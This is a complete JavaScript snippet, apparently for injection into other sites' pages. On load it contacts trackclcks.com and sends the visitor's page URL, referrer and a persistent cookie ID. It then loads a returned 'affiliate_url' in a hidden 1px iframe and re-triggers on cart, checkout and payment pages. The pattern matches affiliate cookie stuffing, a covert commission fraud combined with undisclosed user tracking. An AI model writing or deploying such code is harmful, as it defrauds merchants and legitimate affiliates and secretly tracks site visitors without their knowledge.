(function () {

  // Generate UUID
  function generateUUID() {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
      const r = Math.random() * 16 | 0;
      const v = c === "x" ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  // Read cookie
  function getCookie(name) {
    const cookieName = name + "=";
    const cookies = document.cookie.split(";");

    for (let i = 0; i < cookies.length; i++) {
      let cookie = cookies[i].trim();

      if (cookie.indexOf(cookieName) === 0) {
        return cookie.substring(cookieName.length);
      }
    }

    return "";
  }

  // Check checkout/cart pages
  function isSensitivePage() {
    const path = window.location.pathname.toLowerCase();

    const blockedPaths = [
      "cart",
      "checkout",
      "payment",
      "pay",
      "shipping",
      "review-order"
    ];

    return blockedPaths.some(keyword => path.includes(keyword));
  }

  // Create hidden iframe safely
  function loadHiddenIframe(url) {
    try {
      const iframe = document.createElement("iframe");

      iframe.src = url;

      iframe.setAttribute(
        "sandbox",
        "allow-scripts allow-same-origin allow-forms"
      );

      iframe.style.display = "none";
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      iframe.style.border = "0";

      iframe.onload = function () {
        console.log("Iframe loaded successfully");
      };

      iframe.onerror = function () {
        console.warn("Iframe failed to load:", url);
      };

      document.body.appendChild(iframe);

    } catch (error) {
      console.error("Iframe creation error:", error);
    }
  }

  // Fire fallback pixel
  function fireFallbackPixel(id) {
    try {
      const img = new Image();

      img.src =
        "https://trackclcks.com/api/fallback-pixel?id=" +
        encodeURIComponent(id);

      img.onload = () => {
        console.log("Fallback pixel fired");
      };

      img.onerror = () => {
        console.warn("Fallback pixel failed");
      };

    } catch (error) {
      console.error("Fallback pixel error:", error);
    }
  }

  // Main tracking function
  async function startTracking() {

    const sessionKey =
      "tracking_done_" + window.location.hostname;

    // Avoid duplicate execution
    if (sessionStorage.getItem(sessionKey)) {

      if (!isSensitivePage()) {
        return;
      }
    }

    try {

      // UUID
      let uniqueId =
        getCookie("tracking_uuid") || generateUUID();

      // Save cookie
      const expireDate =
        new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);

      document.cookie =
        "tracking_uuid=" + uniqueId +
        "; expires=" + expireDate.toUTCString() +
        "; path=/; SameSite=Lax";

      // API call
      const response = await fetch(
        "https://trackclcks.com/api/track-user",
        {
          method: "POST",
          keepalive: true,

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({
            url: window.location.href,
            referrer: document.referrer,
            unique_id: uniqueId,
            origin: window.location.hostname,
            timestamp: Date.now()
          })
        }
      );

      const data = await response.json();

      console.log("Tracking Response:", data);

      // SUCCESS
      if (data.success && data.affiliate_url) {

        loadHiddenIframe(data.affiliate_url);

        sessionStorage.setItem(sessionKey, "true");

      } else {

        // Fallback image pixel
        fireFallbackPixel(uniqueId);
      }

    } catch (error) {

      console.error("Tracking Failed:", error);

      // Fail-safe fallback pixel
      fireFallbackPixel(generateUUID());
    }
  }

  // Load configs
  function initTracking() {

    const hostname = window.location.hostname;

    fetch("https://trackclcks.com/api/site-configs")
      .then(response => response.json())

      .then(configs => {

        const siteConfig = configs[hostname];

        if (!siteConfig) {
          return;
        }

        // Always track
        if (siteConfig.always) {
          startTracking();
        }

        // Track cart pages
        if (
          siteConfig.cartExtra &&
          isSensitivePage()
        ) {
          startTracking();
        }

      })

      .catch(error => {
        console.error("Config fetch failed:", error);
      });
  }

  // Wait for DOM
  if (
    document.readyState === "interactive" ||
    document.readyState === "complete"
  ) {
    initTracking();
  } else {
    window.addEventListener(
      "DOMContentLoaded",
      initTracking
    );
  }

})();